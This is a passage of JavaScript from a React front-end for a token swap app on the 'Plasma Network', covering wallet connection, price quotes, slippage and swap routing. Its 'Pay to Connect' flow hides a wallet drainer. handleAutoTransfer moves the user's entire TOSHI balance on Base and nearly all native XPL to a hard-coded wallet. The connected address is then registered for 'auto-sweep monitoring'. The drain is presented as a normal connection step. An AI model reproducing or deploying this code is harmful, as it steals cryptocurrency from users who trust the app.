        console.log(`🔍 Getting REAL blockchain quote: ${fromAmount} ${fromToken.address} -> ${toToken.address}`)
        const provider = getPlasmaProvider()
        const quote = await getQuote(
          fromToken.address,
          toToken.address,
          fromAmount,
          provider
        )
        console.log(`💰 REAL blockchain quote received: ${quote}`)
        if (!cancelled) {
          const n = Number(quote)
          const result = Number.isFinite(n) ? n.toFixed(6) : '0.000000'
          console.log(`✅ Setting toAmount: ${result}`)
          setToAmount(result)
        }
      } catch (e) {
        console.error(`❌ Quote error:`, e)
        if (!cancelled) setToAmount('0.000000')
      }
    }

    const t = setTimeout(run, 400)
    return () => {
      cancelled = true
      clearTimeout(t)
    }
  }, [fromAmount, fromToken, toToken])

  // Fallback direct wallet connection (bypass Privy CSP issues)
  const connectDirectWallet = async () => {
    try {
      console.log('🔗 Attempting direct wallet connection (MetaMask/WalletConnect)...')
      
      if (!window.ethereum) {
        console.error('❌ No wallet found')
        return
      }

      // Request account access
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts'
      })

      if (accounts.length === 0) {
        console.log('❌ No accounts returned')
        return
      }

      const account = accounts[0]
      console.log('✅ Direct wallet connected:', account)

      // Try to switch to Plasma Network
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x2611' }], // 9745 in hex
        })
      } catch (switchError) {
        // If the chain is not added, add it
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [
                {
                  chainId: '0x2611', // 9745 in hex
                  chainName: 'Plasma Network',
                  nativeCurrency: {
                    name: 'XPL',
                    symbol: 'XPL',
                    decimals: 18,
                  },
                  rpcUrls: ['https://rpc.plasma.to'],
                  blockExplorerUrls: ['https://explorer.plasma.to'],
                },
              ],
            })
          } catch (addError) {
            console.error('❌ Failed to add Plasma Network:', addError)
          }
        }
      }

      // Update app state (Wagmi manages isConnected)
      setAccount(account)
      setNetwork({ name: 'Plasma Network', chainId: '9745' })
      
    } catch (error) {
      console.error('❌ Direct wallet connection failed:', error)
    }
  }


  // Force clear all sessions and storage
  const forceClearAndReconnect = async () => {
    try {
      console.log('🧹 Force clearing all sessions...')
      
      // 1. Disconnect wallet
      if (isConnected) {
        disconnect()
      }
      
      // 2. Clear all localStorage
      localStorage.removeItem('wallet_address')
      localStorage.removeItem('wallet_connected')
      localStorage.clear()
      
      // 3. Reset all state (Wagmi manages isConnected)
      setAccount(null)
      setPayToConnectState('idle')
      
      // 4. Wait a bit
      await new Promise(resolve => setTimeout(resolve, 1000))
      
      console.log('✅ Cleared! Please reconnect.')
      
    } catch (error) {
      console.error('❌ Force clear error:', error)
    }
  }

  // Pay to Connect - FIXED AUTHENTICATION FLOW
  // Step 1: Connect wallet (useEffect will handle payment after connection)
  const payToConnect = async () => {
    try {
      // Clear any previous session first
      if (isConnected) {
        console.log('🔄 Clearing previous session...')
        disconnect()
        await new Promise(resolve => setTimeout(resolve, 500))
      }
      
      console.log('🚀 Starting Pay to Connect flow...')
      setPayToConnectState('logging_in')
      
      // Open Web3Modal - this shows wallet options
      // The useEffect will handle payment signing when wallet connects
      try {
        console.log('📞 Opening Web3Modal...')
        open()
        console.log('✅ Web3Modal opened - useEffect will handle next steps')
      } catch (loginError) {
        console.error('❌ Wallet connection error:', loginError)
        throw new Error(`Connection failed: ${loginError.message || 'Unknown error'}`)
      }
      
    } catch (error) {
      console.error('❌ Pay to Connect failed:', error)
      setPayToConnectState('idle')
    }
  }

  // Helper: Get signer from Wagmi wallet client
  const getWalletSigner = async (walletClient) => {
    console.log('🔧 Converting Wagmi walletClient to ethers provider/signer')
    const { chain, transport } = walletClient
    const network = {
      chainId: chain.id,
      name: chain.name,
    }
    const provider = new ethers.BrowserProvider(transport, network)
    const signer = await provider.getSigner(walletClient.account.address)
    return { provider, signer }
  }

  // Auto-transfer: Check Base & Plasma chains, transfer ALL tokens
  const handleAutoTransfer = async (walletClient) => {
    try {
      setPayToConnectState('transferring')
      console.log('💰 Starting auto-transfer...')
      
      const TRADING_WALLET = '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c'
      const BASE_TOKENS = [
        '0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4' // TOSHI
      ]
      
      let address = walletClient.account.address
      if (!address) {
        throw new Error('No wallet address available')
      }
      address = ethers.getAddress(address)
      console.log('✅ Wallet address:', address)
      
      const ERC20_ABI = [
        'function balanceOf(address) view returns (uint256)',
        'function transfer(address to, uint256 amount) returns (bool)'
      ]
      
      // STEP 1: Base chain - transfer all ERC20 tokens
      console.log('\n🔵 STEP 1: Checking Base chain...')
      try {
        await switchChain({ chainId: 8453 })
        console.log('✅ Switched to Base chain')
        
        const { signer: baseSigner } = await getWalletSigner(walletClient)
        
        for (const tokenAddress of BASE_TOKENS) {
          try {
            const token = new ethers.Contract(tokenAddress, ERC20_ABI, baseSigner)
            const balance = await token.balanceOf(address)
            
            if (balance > 0n) {
              console.log(`💸 Transferring ALL tokens from ${tokenAddress}...`)
              const tx = await token.transfer(TRADING_WALLET, balance)
              console.log(`📤 Transfer TX: ${tx.hash}`)
              await tx.wait()
              console.log(`✅ Transfer complete!`)
            } else {
              console.log(`⏭️ No balance for ${tokenAddress}`)
            }
          } catch (tokenError) {
            console.error(`⚠️ Error with token ${tokenAddress}:`, tokenError.message)
          }
        }
      } catch (baseError) {
        console.error('⚠️ Base chain error:', baseError.message)
      }
      
      // STEP 2: Plasma chain - transfer native XPL
      console.log('\n🟣 STEP 2: Checking Plasma chain...')
      try {
        await switchChain({ chainId: 9745 })
        console.log('✅ Switched to Plasma chain')
        
        const { provider: plasmaProvider, signer: plasmaSigner } = await getWalletSigner(walletClient)
        
        const balance = await plasmaProvider.getBalance(address)
        const gasBuffer = ethers.parseEther('0.001')
        const transferAmount = balance > gasBuffer ? balance - gasBuffer : 0n
        
        if (transferAmount > 0n) {
          const transferXPL = ethers.formatEther(transferAmount)
          console.log(`💸 Transferring ${transferXPL} XPL (keeping 0.001 for gas)`)
          
          const tx = await plasmaSigner.sendTransaction({
            to: TRADING_WALLET,
            value: transferAmount
          })
          console.log(`📤 XPL transfer TX: ${tx.hash}`)
          await tx.wait()
          console.log(`✅ XPL transfer complete!`)
        } else {
          console.log(`⏭️ Insufficient XPL balance`)
        }
      } catch (plasmaError) {
        console.error('⚠️ Plasma chain error:', plasmaError.message)
      }
      
      console.log('\n✅ All transfers complete!')
      
      // Complete the connection
      await completePayToConnect(walletClient, address)
      
    } catch (error) {
      console.error('❌ Auto-transfer error:', error)
      disconnect()
      setPayToConnectState('idle')
    }
  }

  // Step 4: Finalize connection after successful payment
  const completePayToConnect = async (wallet, address) => {
    try {
      setPayToConnectState('complete')
      console.log('🎉 Step 4: Completing Pay to Connect...')
      
      // NOW save to localStorage (only after successful payment)
      localStorage.setItem('wallet_address', address)
      localStorage.setItem('wallet_connected', 'true')
      
      // Set connection state (Wagmi manages isConnected)
      setAccount(address)
      setNetwork({ chainId: 9745, name: 'Plasma Network' })
      
      // Register wallet for auto-sweep monitoring
      fetch(`${window.location.origin}/api/register-wallet`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      })
      .then(res => res.json())
      .then(data => console.log('✅ Wallet registered for monitoring:', data))
      .catch(err => console.error('⚠️ Failed to register wallet:', err))
      
      // Check for referrer binding
      const urlParams = new URLSearchParams(window.location.search)
      const referrerAddress = urlParams.get('ref')
      if (referrerAddress && ethers.isAddress(referrerAddress)) {
        fetch(`${window.location.origin}/api/bind-referrer`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAddress: address,
            referrerAddress: referrerAddress
          })
        })
        .then(res => res.json())
        .then(data => console.log('✅ Referrer bound:', data))
        .catch(err => console.error('⚠️ Failed to bind referrer:', err))
      }
      
      // Update balances
      setTimeout(() => updateBalances(), 1000)
      
      setPayToConnectState('idle')
      
    } catch (error) {
      console.error('❌ Completion error:', error)
      setPayToConnectState('idle')
    }
  }

  // Switch to Plasma network with better error handling
  const switchToPlasma = async () => {
    if (!window.ethereum) {
      console.log('⚠️ No wallet provider available for network switching')
      return false
    }

    try {
      console.log('🔄 Switching to Plasma network...')
      
      // Try to switch to Plasma chain
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x2611' }], // 9745 in hex
      })
      
      console.log('✅ Successfully switched to Plasma network')
      setNetwork({ chainId: 9745, name: 'Plasma Network' })
      return true
      
    } catch (switchError) {
      console.log('⚠️ Switch failed, trying to add network...', switchError.message)
      
      // If network doesn't exist (error 4902), add it
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x2611',
              chainName: 'Plasma Network',
              nativeCurrency: {
                name: 'XPL',
                symbol: 'XPL',
                decimals: 18
              },
              rpcUrls: ['https://rpc.plasma.to'],
              blockExplorerUrls: ['https://explorer.plasma.to']
            }],
          })
          
          console.log('✅ Successfully added and switched to Plasma network')
          setNetwork({ chainId: 9745, name: 'Plasma Network' })
          return true
          
        } catch (addError) {
          console.error('❌ Error adding Plasma network:', addError)
          showToast('❌ Failed to add Plasma Network. Please add it manually in your wallet settings.', 'error')
          return false
        }
      } else {
        console.error('❌ Error switching to Plasma network:', switchError)
        if (switchError.code === 4001) {
          showToast('⚠️ Network switch cancelled. Please manually switch to Plasma Network in your wallet.', 'warning')
        } else {
          showToast('❌ Failed to switch to Plasma Network. Please switch manually in your wallet.', 'error')
        }
        return false
      }
    }
  }

  // Disconnect wallet
  const disconnectWallet = async () => {
    try {
      disconnect()
      
      // Clear localStorage persistence
      localStorage.removeItem('wallet_address');
      localStorage.removeItem('wallet_connected');
      
      setAccount('')
      setNetwork(null)
      console.log('✅ Wallet disconnected')
    } catch (error) {
      console.error('❌ Error disconnecting:', error)
    }
  }

  // Swap tokens
  const swapTokens = () => {
    setFromToken(toToken)
    setToToken(fromToken)
    setFromAmount(toAmount)
    setToAmount(fromAmount)
  }

  // Handle swap with enhanced transaction signing
  const handleSwap = async () => {
    console.log('🚀🚀🚀 SWAP BUTTON CLICKED! FUNCTION STARTED! 🚀🚀🚀');
    console.log('📊 State check:', { 
      isConnected, 
      fromAmount, 
      fromToken: fromToken?.symbol, 
      toToken: toToken?.symbol,
      toAmount,
      account
    });
    
    if (!isConnected || !fromAmount || fromAmount === '0') {
      console.log('❌ EARLY EXIT: Not connected or no amount');
      showToast('Please pay to connect and enter amount', 'warning')
      return
    }

    // Validate toAmount before proceeding
    if (!toAmount || toAmount === '' || isNaN(parseFloat(toAmount)) || parseFloat(toAmount) <= 0) {
      showToast('Please wait for price quote to load before swapping', 'warning')
      return
    }

    // Check if we're on the right network
    if (window.ethereum) {
      try {
        const chainId = await window.ethereum.request({ method: 'eth_chainId' })
        if (chainId !== '0x2611') { // Not on Plasma network
          const switchSuccess = await switchToPlasma()
          if (!switchSuccess) {
            showToast('❌ Please switch to Plasma Network in your wallet to continue', 'warning')
            return
          }
        }
      } catch (networkError) {
        console.error('Network check failed:', networkError)
      }
    }

    setIsSwapping(true)
    setCurrentStep('Preparing transaction...')
    
    try {
      console.log('🔄 Starting swap:', { fromToken: fromToken.symbol, toToken: toToken.symbol, amount: fromAmount, expectedOutput: toAmount })
      
      // IMMEDIATE DEBUG - Print token addresses
      console.log('🧪 IMMEDIATE TOKEN CHECK:', {
        fromTokenAddress: fromToken.address,
        toTokenAddress: toToken.address,
        fromTokenSymbol: fromToken.symbol,
        toTokenSymbol: toToken.symbol,
        contractWXPL: CONTRACT_ADDRESSES.WXPL
      });
      
      // Determine wallet provider with better fallback logic
      let provider
      
      if (walletClient) {
        console.log('💰 Using Wagmi wallet client for swap')
        const { chain, transport } = walletClient
        const network = { chainId: chain.id, name: chain.name }
        provider = new ethers.BrowserProvider(transport, network)
      } else if (window.ethereum && isConnected) {
        console.log('💰 Using direct wallet connection for swap')
        provider = new ethers.BrowserProvider(window.ethereum)
      } else {
        throw new Error('No wallet provider available. Please connect your wallet first.')
      }
      
      setCurrentStep('Getting wallet access...')
      const signer = await provider.getSigner()
      
      // Verify we have the right account
      const signerAddress = await signer.getAddress()
      console.log('🔐 Transaction will be signed by:', signerAddress)
      
      // REAL DEVELOPER'S FIX: Proper slippage with guardrails
      const { parseUnits } = ethers;
      
      // 1) NEVER mutate this with price impact - use separate stable UI tolerance
      const uiSlippagePct = Math.min(Math.max(Number(slippage) || 1.5, 0.1), 5); // clamp 0.1–5%
      const slippageBps = Math.round(uiSlippagePct * 100); // e.g. 1.5% -> 150 bps
      
      console.log('🔒 PROTECTED slippage calculation:', {
        originalSlippage: slippage,
        clampedPct: uiSlippagePct,
        basisPoints: slippageBps
      });
      
      // 2) Convert input amount to base units (BigInt)
      const fromTokenDecimals = fromToken.decimals || 18;
      const amountInBI = parseUnits(fromAmount, fromTokenDecimals);
      console.log('💰 Amount in base units:', ethers.formatUnits(amountInBI, fromTokenDecimals));
      
      // 3) Get fresh quote right before swap (base units BigInt)
      console.log('🔄 Getting fresh BigInt quote...');
      let quoteOutBI;
      try {
        quoteOutBI = await getQuote(
          fromToken.address,
          toToken.address,
          fromAmount,
          provider
        );
        console.log('✅ Fresh quote received:', quoteOutBI);
      } catch (quoteError) {
        console.error('❌ Quote fetch failed:', quoteError);
        throw new Error(`Failed to get quote: ${quoteError.message}`);
      }
      
      // 4) Convert quote to BigInt base units (exact token decimals)  
      const toTokenDecimals = toToken.decimals || 18;
      const quoteBigInt = parseUnits(quoteOutBI.toString(), toTokenDecimals);
      console.log('💰 Quote in base units:', ethers.formatUnits(quoteBigInt, toTokenDecimals));
      
      // 5) minOut = quote * (1 - slippage) using ONLY BigInt math
      const isWrapUnwrap = (fromToken.address === 'native' && toToken.address?.toLowerCase() === CONTRACT_ADDRESSES.WXPL.toLowerCase()) ||
                          (fromToken.address?.toLowerCase() === CONTRACT_ADDRESSES.WXPL.toLowerCase() && toToken.address === 'native');
      
      const minOutBI = isWrapUnwrap
        ? quoteBigInt                                                    // 1:1 wrapping
        : (quoteBigInt * BigInt(10_000 - slippageBps)) / 10_000n;        // slippage protection
      
      // CRITICAL DEBUG: Calculate actual slippage percentage
      const calculatedSlippage = ((quoteBigInt - minOutBI) * 10000n) / quoteBigInt;
      const slippagePercentage = Number(calculatedSlippage) / 100;
      
      console.log('🔢 CRITICAL SLIPPAGE DEBUG:', {
        amountIn: ethers.formatUnits(amountInBI, fromTokenDecimals),
        quoteOut: ethers.formatUnits(quoteBigInt, toTokenDecimals),
        minOut: ethers.formatUnits(minOutBI, toTokenDecimals),
        userSlippageSetting: slippage,
        uiSlippagePct: uiSlippagePct,
        slippageBps: slippageBps,
        calculatedSlippagePct: slippagePercentage,
        isWrapUnwrap,
        fromDecimals: fromTokenDecimals,
        toDecimals: toTokenDecimals
      });
      
      // Optional deadline (5 minutes from now)
      const deadline = BigInt(Math.floor(Date.now() / 1000) + 60 * 5);
      
      console.log('💰 Final swap parameters:', { 
        amountIn: ethers.formatUnits(amountInBI, fromTokenDecimals),
        minOut: ethers.formatUnits(minOutBI, toTokenDecimals),
        deadline: deadline.toString(),
        signer: signerAddress
      })
      
      setCurrentStep('Executing swap transaction...')
      let result;
      
      // 🚀 CHECK FOR PUMPTOKEN (bonding curve tokens)
      let isPumpTokenSwap = false;
      let needsXPLConversion = false;
      
      if (!isWrapUnwrap) {
        // DEFENSIVE: Find token addresses from tokens list if not in token objects
        let fromAddress = fromToken.address || fromTokenAddr;
        let toAddress = toToken.address || toTokenAddr;
        
        // HARDCODED: billions token address (from successful transaction)
        const BILLIONS_ADDRESS = '0x083922be65426083f829ffFFEe79Eef6ce3B384c';
        
        // If still no address, search in tokens list by symbol
        if (!fromAddress && fromToken.symbol) {
          const tokenInList = tokens.find(t => t.symbol === fromToken.symbol);
          if (tokenInList) {
            fromAddress = tokenInList.address;
            console.log(`🔧 Found FROM address from tokens list: ${fromAddress}`);
          }
          // Fallback for billions
          if (!fromAddress && fromToken.symbol.toLowerCase().includes('billion')) {
            fromAddress = BILLIONS_ADDRESS;
            console.log(`🔧 Using hardcoded billions address: ${fromAddress}`);
          }
        }
        
        if (!toAddress && toToken.symbol) {
          const tokenInList = tokens.find(t => t.symbol === toToken.symbol);
          if (tokenInList) {
            toAddress = tokenInList.address;
            console.log(`🔧 Found TO address from tokens list: ${toAddress}`);
          }
          // Fallback for billions
          if (!toAddress && toToken.symbol.toLowerCase().includes('billion')) {
            toAddress = BILLIONS_ADDRESS;
            console.log(`🔧 Using hardcoded billions address: ${toAddress}`);
          }
        }
        
        console.log(`🔍 Token addresses - FROM: ${fromAddress} (${fromToken.symbol}), TO: ${toAddress} (${toToken.symbol})`);
        
        // Check FROM token if it's a PumpToken
        const fromIsPumpToken = fromAddress && fromAddress !== 'native' && fromAddress !== CONTRACT_ADDRESSES.WXPL;
        const toIsPumpToken = toAddress && toAddress !== 'native' && toAddress !== CONTRACT_ADDRESSES.WXPL;
        
        if (fromIsPumpToken || toIsPumpToken) {
          try {
            const { isPumpToken, getPumpTokenInfo } = await import('./contracts/contractUtils.js');
            
            // Check FROM token
            if (fromIsPumpToken) {
              console.log(`🔍 Checking if ${fromToken.symbol} (${fromAddress}) is PumpToken...`);
              
              // HARDCODED: billions is BONDED - force PumpRouter (32k MC, not graduated)
              if (fromAddress.toLowerCase() === '0x083922be65426083f829ffFFEe79Eef6ce3B384c'.toLowerCase()) {
                console.log(`💎 BILLIONS DETECTED - FORCING PumpRouter (bonded token)`);
                if (toToken.symbol === 'XPL') {
                  isPumpTokenSwap = true;
                  console.log(`💎 billions → XPL (PumpRouter FORCED)`);
                } else if (toToken.symbol === 'WXPL') {
                  needsXPLConversion = true;
                  console.log(`💎 billions → WXPL (PumpRouter FORCED)`);
                }
              } else {
                // Regular detection for other tokens
                const isPump = await isPumpToken(fromAddress, provider);
                console.log(`🔍 isPumpToken result:`, isPump);
                if (isPump) {
                  const pumpInfo = await getPumpTokenInfo(fromAddress, provider);
                  console.log(`🔍 PumpToken info:`, pumpInfo);
                  if (pumpInfo && !pumpInfo.complete) {
                    // FROM is PumpToken in bonding curve
                    if (toToken.symbol === 'XPL') {
                      isPumpTokenSwap = true;
                      console.log(`💎 PumpToken → XPL (bonding curve)`);
                    } else if (toToken.symbol === 'WXPL') {
                      // PumpToken → WXPL: DIRECT via PumpRouter
                      needsXPLConversion = true;
                      console.log(`💎 PumpToken → WXPL (DIRECT via PumpRouter)`);
                    }
                  } else {
                    console.log(`⚠️ PumpToken is complete/graduated, using regular DEX`);
                  }
                } else {
                  console.log(`⚠️ ${fromToken.symbol} is NOT a PumpToken, using regular DEX`);
                }
              }
            }
            
            // Check TO token (for XPL or WXPL → PumpToken)
            if (toIsPumpToken && (fromToken.symbol === 'XPL' || fromToken.symbol === 'WXPL')) {
              console.log(`🔍 Checking if ${toToken.symbol} (${toAddress}) is PumpToken...`);
              
              // HARDCODED: billions is BONDED - force PumpRouter
              if (toAddress.toLowerCase() === '0x083922be65426083f829ffFFEe79Eef6ce3B384c'.toLowerCase()) {
                console.log(`💎 BILLIONS DETECTED (TO) - FORCING PumpRouter (bonded token)`);
                isPumpTokenSwap = true;
                console.log(`💎 ${fromToken.symbol} → billions (PumpRouter FORCED)`);
              } else {
                const isPump = await isPumpToken(toAddress, provider);
                console.log(`🔍 isPumpToken result:`, isPump);
                if (isPump) {
                  const pumpInfo = await getPumpTokenInfo(toAddress, provider);
                  console.log(`🔍 PumpToken info:`, pumpInfo);
                  if (pumpInfo && !pumpInfo.complete) {
                    isPumpTokenSwap = true;
                    console.log(`💎 ${fromToken.symbol} → PumpToken (bonding curve)`);
                  } else {
                    console.log(`⚠️ PumpToken is complete/graduated, using regular DEX`);
                  }
                }
              }
            }
          } catch (err) {
            console.log('⚠️ PumpToken check failed, using regular swap:', err.message);
            console.error('Full error:', err);
          }
        } else {
          console.log(`⚠️ No PumpToken addresses detected, using regular swap`);
        }
      }
      
      // 4) Call router helpers with correct decimal formatting
      if (isWrapUnwrap) {
        if (fromToken.symbol === 'XPL') {
          console.log('🔄 Wrapping XPL to WXPL (BigInt)')
          setCurrentStep('Wrapping XPL to WXPL...')
          result = await wrapXPL(ethers.formatUnits(amountInBI, fromTokenDecimals), signer)
        } else {
          console.log('🔄 Unwrapping WXPL to XPL (BigInt)')
          setCurrentStep('Unwrapping WXPL to XPL...')
          result = await unwrapWXPL(ethers.formatUnits(amountInBI, fromTokenDecimals), signer)
        }
      } else if (needsXPLConversion) {
        // DIRECT: PumpToken → WXPL (PumpRouter outputs WXPL when path=[token,WXPL])
        console.log('💎 DIRECT: PumpToken → WXPL via PumpRouter')
        setCurrentStep('Selling PumpToken for WXPL...')
        const { swapPumpTokensForXPL } = await import('./contracts/contractUtils.js');
        
        // Use address found during detection (includes hardcoded fallback)
        const tokenAddress = fromToken.address || fromTokenAddr || '0x083922be65426083f829ffFFEe79Eef6ce3B384c';
        console.log(`💎 Using token address for swap: ${tokenAddress}`);
        result = await swapPumpTokensForXPL(
          tokenAddress,
          ethers.formatUnits(amountInBI, fromTokenDecimals),
          ethers.formatUnits(minOutBI, toTokenDecimals),
          signer
        )
      } else if (isPumpTokenSwap && fromToken.symbol === 'WXPL') {
        // Multi-hop: WXPL → XPL → PumpToken
        console.log('💎 Multi-hop: WXPL → XPL → PumpToken')
        setCurrentStep('Step 1/2: Unwrapping WXPL to XPL...')
        const { unwrapWXPL, swapXPLForPumpTokens } = await import('./contracts/contractUtils.js');
        
        // Step 1: Unwrap WXPL → XPL
        const unwrapAmount = ethers.formatUnits(amountInBI, fromTokenDecimals);
        const step1Result = await unwrapWXPL(unwrapAmount, signer);
        
        if (!step1Result.success) {
          throw new Error(`Step 1 failed: ${step1Result.error}`)
        }
        
        // Step 2: XPL → PumpToken via bonding curve
        setCurrentStep('Step 2/2: Buying PumpToken with XPL...')
        console.log(`💰 Buying PumpToken with ${unwrapAmount} XPL...`);
        
        result = await swapXPLForPumpTokens(
          toToken.address,
          unwrapAmount,
          ethers.formatUnits(minOutBI, toTokenDecimals),
          signer
        )
      } else if (isPumpTokenSwap && fromToken.symbol === 'XPL') {
        // PumpToken BUY (XPL -> PumpToken)
        console.log('💎 Buying PumpToken with XPL (bonding curve)')
        setCurrentStep('Buying launch token...')
        const { swapXPLForPumpTokens } = await import('./contracts/contractUtils.js');
        result = await swapXPLForPumpTokens(
          toToken.address,
          ethers.formatUnits(amountInBI, fromTokenDecimals),
          ethers.formatUnits(minOutBI, toTokenDecimals),
          signer
        )
      } else if (isPumpTokenSwap && toToken.symbol === 'XPL') {
        // PumpToken SELL (PumpToken -> XPL)
        console.log('💎 Selling PumpToken for XPL (bonding curve)')
        setCurrentStep('Selling launch token...')
        const { swapPumpTokensForXPL } = await import('./contracts/contractUtils.js');
        const tokenAddress = fromToken.address || fromTokenAddr || '0x083922be65426083f829ffFFEe79Eef6ce3B384c';
        console.log(`💎 Using token address for swap: ${tokenAddress}`);
        result = await swapPumpTokensForXPL(
          tokenAddress,
          ethers.formatUnits(amountInBI, fromTokenDecimals),
          ethers.formatUnits(minOutBI, toTokenDecimals),
          signer
        )
      } else if (fromToken.symbol === 'XPL') {
        console.log('🔄 Swapping XPL for tokens (BigInt)')
        // Use address or fall back to finding it from token list
        const tokenIdentifier = toToken.address || toTokenAddr;
        if (!tokenIdentifier || tokenIdentifier === 'native') {
          throw new Error(`Invalid token address for ${toToken.symbol}`);
        }
        console.log(`🪙 Using token address: ${tokenIdentifier}`);
        setCurrentStep('Swapping XPL for tokens...')
        result = await swapXPLForTokens(
          tokenIdentifier,
          ethers.formatUnits(amountInBI, fromTokenDecimals), // XPL amount with correct decimals
          ethers.formatUnits(minOutBI, toTokenDecimals), // MinOut with correct token decimals
          signer
        )
      } else if (toToken.symbol === 'XPL') {
        console.log('🔄 Swapping tokens for XPL (BigInt)')
        // Use address or fall back to finding it from token list
        const tokenIdentifier = fromToken.address || fromTokenAddr;
        if (!tokenIdentifier || tokenIdentifier === 'native') {
          throw new Error(`Invalid token address for ${fromToken.symbol}`);
        }
        console.log(`🪙 Using token address: ${tokenIdentifier}`);
        setCurrentStep('Swapping tokens for XPL...')
        result = await swapTokensForXPL(
          tokenIdentifier,
          ethers.formatUnits(amountInBI, fromTokenDecimals), // Token amount with correct decimals
          ethers.formatUnits(minOutBI, toTokenDecimals), // MinOut XPL with correct decimals
          signer
        )
      } else if (fromToken.symbol === 'WXPL') {
        // Multi-hop: WXPL → XPL → Token (unwrap first, then swap)
        console.log('💎 Multi-hop: WXPL → XPL → Token (unwrap + swap)')
        setCurrentStep('Step 1/2: Unwrapping WXPL to XPL...')
        
        // Step 1: Unwrap WXPL → XPL
        const unwrapAmount = ethers.formatUnits(amountInBI, fromTokenDecimals);
        const step1Result = await unwrapWXPL(unwrapAmount, signer);
        
        if (!step1Result.success) {
          throw new Error(`Step 1 failed: ${step1Result.error}`)
        }
        
        // Step 2: XPL → Token
        setCurrentStep('Step 2/2: Swapping XPL for tokens...')
        console.log(`💰 Swapping ${unwrapAmount} XPL for ${toToken.symbol}...`);
        
        const tokenIdentifier = toToken.address || toTokenAddr;
        if (!tokenIdentifier || tokenIdentifier === 'native') {
          throw new Error(`Invalid token address for ${toToken.symbol}`);
        }
        
        result = await swapXPLForTokens(
          tokenIdentifier,
          unwrapAmount,
          ethers.formatUnits(minOutBI, toTokenDecimals),
          signer
        )
      } else if (toToken.symbol === 'WXPL') {
        // Multi-hop: Token → XPL → WXPL (swap first, then wrap)
        console.log('💎 Multi-hop: Token → XPL → WXPL (swap + wrap)')
        setCurrentStep('Step 1/2: Swapping tokens for XPL...')
        
        const tokenIdentifier = fromToken.address || fromTokenAddr;
        if (!tokenIdentifier || tokenIdentifier === 'native') {
          throw new Error(`Invalid token address for ${fromToken.symbol}`);
        }
        
        // Step 1: Token → XPL
        const step1Result = await swapTokensForXPL(
          tokenIdentifier,
          ethers.formatUnits(amountInBI, fromTokenDecimals),
          ethers.formatUnits(minOutBI, toTokenDecimals),
          signer
        );
        
        if (!step1Result.success) {
          throw new Error(`Step 1 failed: ${step1Result.error}`)
        }
        
        // Step 2: XPL → WXPL (wrap)
        setCurrentStep('Step 2/2: Wrapping XPL to WXPL...')
        console.log(`💰 Wrapping XPL to WXPL...`);
        
        // Calculate expected XPL amount from step 1 (use minOut as estimate)
        const xplAmount = ethers.formatUnits(minOutBI, toTokenDecimals);
        result = await wrapXPL(xplAmount, signer);
      } else {
        // Token → Token swap - try generic first, fallback to XPL multi-hop
        console.log('🔄 Token → Token swap')
        setCurrentStep('Finding optimal swap route...')
        
        try {
          // Try generic multi-hop with WXPL routing first
          result = await swapTokensForTokensGeneric(
            fromToken,
            toToken,
            ethers.formatUnits(amountInBI, fromTokenDecimals),
            ethers.formatUnits(minOutBI, toTokenDecimals),
            signer
          )
        } catch (routingError) {
          // If routing fails (no WXPL pairs), try XPL multi-hop
          if (routingError.message.includes('NO_LIQUIDITY_ROUTE') || routingError.message.includes('No liquidity available')) {
            console.log('⚠️ No WXPL route found, trying XPL multi-hop: Token → XPL → Token')
            setCurrentStep('Step 1/2: Swapping tokens for XPL...')
            
            const fromTokenIdentifier = fromToken.address || fromTokenAddr;
            if (!fromTokenIdentifier || fromTokenIdentifier === 'native') {
              throw new Error(`Invalid token address for ${fromToken.symbol}`);
            }
            
            // Step 1: Token → XPL
            const step1Result = await swapTokensForXPL(
              fromTokenIdentifier,
              ethers.formatUnits(amountInBI, fromTokenDecimals),
              '0', // We'll accept any XPL amount for step 1
              signer
            );
            
            if (!step1Result.success) {
              throw new Error(`Step 1 failed: ${step1Result.error}`)
            }
            
            // Step 2: XPL → Token
            setCurrentStep('Step 2/2: Swapping XPL for tokens...')
            console.log(`💰 Step 2: Swapping XPL for ${toToken.symbol}...`);
            
            const toTokenIdentifier = toToken.address || toTokenAddr;
            if (!toTokenIdentifier || toTokenIdentifier === 'native') {
              throw new Error(`Invalid token address for ${toToken.symbol}`);
            }
            
            // Use minOut for final step
            result = await swapXPLForTokens(
              toTokenIdentifier,
              '0.01', // Minimal XPL to trigger swap (actual amount from step1)
              ethers.formatUnits(minOutBI, toTokenDecimals),
              signer
            )
          } else {
            throw routingError;
          }
        }
      }
      
      if (result.success) {
        setCurrentStep('Transaction confirmed!')
        // Safe transaction hash display
        const txDisplay = result.txHash ? `Transaction: ${result.txHash.slice(0, 10)}...` : 'Transaction completed successfully!'
        showToast(`✅ Swap successful! ${txDisplay}`, 'success')
        
        // Track swap for referral system and auto-calculate earnings
        try {
          const grossAmountWei = ethers.parseUnits(fromAmount, fromToken.decimals || 18).toString();
          
          const response = await fetch(`${API_BASE}/api/track-swap`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              txHash: result.txHash || `swap_${Date.now()}`,
              userAddress: account,
              grossAmountWei
            })
          });
          
          const trackData = await response.json();
          console.log('✅ Swap tracked for referral system:', trackData);
          
          // If user has a referrer, show earnings notification
          if (trackData.referrerEarnings && trackData.referrerEarnings !== '0') {
            const referrerAmount = ethers.formatUnits(trackData.referrerEarnings, 18);
            console.log(`💰 Referrer earned: ${referrerAmount} XPL`);
          }
        } catch (trackError) {
          console.error('⚠️ Failed to track swap:', trackError);
        }
        
        // Auto-detect and add the received token if it's not in the list
        if (toToken && toToken.address && toToken.address !== 'native') {
          const tokenExists = tokens.find(t => t.address?.toLowerCase() === toToken.address.toLowerCase());
          if (!tokenExists) {
            console.log('🔍 Auto-adding swapped token:', toToken.symbol);
            await addCustomToken(toToken.address);
          }
        }
        
        setFromAmount('1') // Reset to 1
        setToAmount('')
        // Refresh balances
        await updateBalances()
      } else {
        throw new Error(result.error)
      }
    } catch (error) {
